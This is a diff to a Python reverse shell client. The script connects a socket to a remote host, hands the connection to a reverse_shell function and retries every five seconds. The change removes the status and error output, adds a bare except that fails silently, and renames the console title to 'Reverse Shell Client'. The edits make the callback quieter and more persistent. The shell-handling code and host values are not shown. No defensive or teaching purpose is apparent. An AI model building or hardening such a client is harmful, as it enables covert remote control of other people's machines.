@@ -26,13 +26,10 @@ def connect():
         try:
             client = socket.socket()
             client.connect(host)
-            print(f"Connected to: {ip}:{port}")
             reverse_shell(client)
 
-        except ConnectionError as e:
-            print("Error:", e)
-
-        time.sleep(5)
+        except:
+            time.sleep(5)
 
 
 def reverse_shell(client):
@@ -67,5 +64,5 @@ def execute_command(command):
 
 
 clear()
-set_console_title("Client")
+set_console_title("Reverse Shell Client")
 connect()
